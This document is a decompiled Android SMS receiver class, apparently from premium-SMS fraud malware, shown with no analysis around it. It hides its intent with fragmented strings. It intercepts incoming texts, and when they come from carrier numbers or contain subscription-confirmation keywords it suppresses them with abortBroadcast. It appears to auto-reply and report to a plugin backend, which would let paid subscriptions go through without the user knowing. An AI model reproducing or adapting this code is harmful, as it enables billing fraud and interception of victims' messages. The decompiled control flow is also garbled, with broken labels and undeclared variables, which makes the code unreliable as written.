package cn.mono.gink;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import org.json.JSONException;
import org.json.JSONObject;

public class URI
  extends BroadcastReceiver
{
  private String TAG = "URI";
  protected MyLogger logger = MyLogger.getLogger();
  
  public URI() {}
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    paramContext = paramIntent.getAction();
    this.logger.e(this.TAG, paramContext);
    paramContext = new StringBuffer(56);
    paramContext.append("SM");
    paramContext.append("S_RECEI");
    paramContext.append("VED");
    localObject1 = new StringBuffer(56);
    ((StringBuffer)localObject1).append("WA");
    ((StringBuffer)localObject1).append("P_PUS");
    ((StringBuffer)localObject1).append("H_REC");
    ((StringBuffer)localObject1).append("EIVED");
    if (paramIntent.getAction().contains(paramContext.toString()))
    {
      paramContext = paramIntent.getExtras();
      if (paramContext != null) {}
    }
    label212:
    while (!paramIntent.getAction().contains(((StringBuffer)localObject1).toString()))
    {
      return;
      paramIntent = (Object[])paramContext.get("pdus");
      paramContext = new byte[paramIntent.length][];
      int i = 0;
      while (i < paramContext.length)
      {
        paramContext[i] = ((byte[])(byte[])paramIntent[i]);
        i += 1;
      }
      paramIntent = new byte[paramContext.length][];
      SmsMessage[] arrayOfSmsMessage = new SmsMessage[paramIntent.length];
      i = 0;
      while (i < paramIntent.length)
      {
        paramIntent[i] = paramContext[i];
        arrayOfSmsMessage[i] = SmsMessage.createFromPdu(paramIntent[i]);
        i += 1;
      }
      int k = arrayOfSmsMessage.length;
      i = 0;
      String str1;
      String str2;
      if (i < k)
      {
        paramContext = arrayOfSmsMessage[i];
        str1 = paramContext.getDisplayOriginatingAddress();
        str2 = paramContext.getDisplayMessageBody();
        this.logger.e(this.TAG, str1);
        this.logger.e(this.TAG, str2);
        paramContext = null;
        paramIntent = null;
        localObject1 = null;
        localObject2 = null;
        Object localObject7 = null;
        Object localObject3 = localObject7;
        for (;;)
        {
          try
          {
            if (PluginSdk.ddjjobject != null) {
              paramContext = PluginSdk.ddjjobject.getString("ad");
            }
            localJSONException1.printStackTrace();
          }
          catch (JSONException localJSONException1)
          {
            for (;;)
            {
              Object localObject5;
              Object localObject6;
              try
              {
                paramIntent = PluginSdk.ddjjobject.getString("dd");
              }
              catch (JSONException localJSONException2)
              {
                Object localObject4;
                int j;
                localObject2 = paramContext;
                localObject1 = null;
                paramIntent = null;
                paramContext = null;
                continue;
              }
              try
              {
                localObject1 = PluginSdk.ddjjobject.getString("pd");
              }
              catch (JSONException localJSONException3)
              {
                localObject2 = paramContext;
                localObject1 = paramIntent;
                paramIntent = null;
                paramContext = null;
                continue;
              }
              try
              {
                localObject2 = PluginSdk.ddjjobject.getString("cd");
              }
              catch (JSONException localJSONException4)
              {
                localObject2 = paramContext;
                localObject5 = paramIntent;
                paramIntent = (Intent)localObject1;
                paramContext = null;
                localObject1 = localObject5;
                continue;
              }
              try
              {
                localObject3 = PluginSdk.ddjjobject.getString("pn");
                if ((localObject1 == null) || (((String)localObject1).length() <= 0) || (!str2.contains(paramContext))) {
                  continue;
                }
                abortBroadcast();
                this.logger.e(this.TAG, str1 + (String)localObject1);
                PluginSdk.dosubmit_B("31", "DD_" + paramIntent);
                PluginSdk.SayTest(str1, (String)localObject1, 1);
                return;
              }
              catch (JSONException localJSONException5)
              {
                localObject5 = paramContext;
                localObject6 = paramIntent;
                paramIntent = (Intent)localObject1;
                paramContext = (Context)localObject2;
                localObject1 = localObject6;
                localObject2 = localObject5;
                continue;
                paramContext = Boolean.valueOf(false);
              }
            }
            localJSONException1 = localJSONException1;
            localObject2 = null;
            localObject1 = null;
            paramIntent = null;
            paramContext = null;
          }
          localObject5 = localObject1;
          localObject6 = localObject2;
          localObject4 = localObject7;
          localObject2 = paramContext;
          localObject1 = paramIntent;
          paramIntent = (Intent)localObject5;
          paramContext = (Context)localObject6;
        }
        if ((str1.contains("10086")) || (str2.contains("成功订购")) || (str2.contains("和视频")) || (str2.contains("和视界")) || (str2.contains(localObject4)) || (str1.contains("1065")) || (str1.contains("1066")) || (str1.contains("118010")) || (str1.contains("10001888")))
        {
          this.logger.e(this.TAG, str1 + str2);
          abortBroadcast();
          return;
        }
        if (((String)localObject2).length() > 0)
        {
          paramContext = ((String)localObject2).split(";");
          j = 0;
        }
      }
      for (;;)
      {
        if (j >= paramContext.length) {
          break label770;
        }
        if (str2.contains(paramContext[j]))
        {
          paramContext = Boolean.valueOf(true);
          if (paramContext.booleanValue()) {
            abortBroadcast();
          }
          this.logger.e(this.TAG, str1);
          i += 1;
          break label212;
          break;
        }
        j += 1;
      }
    }
    abortBroadcast();
  }
}
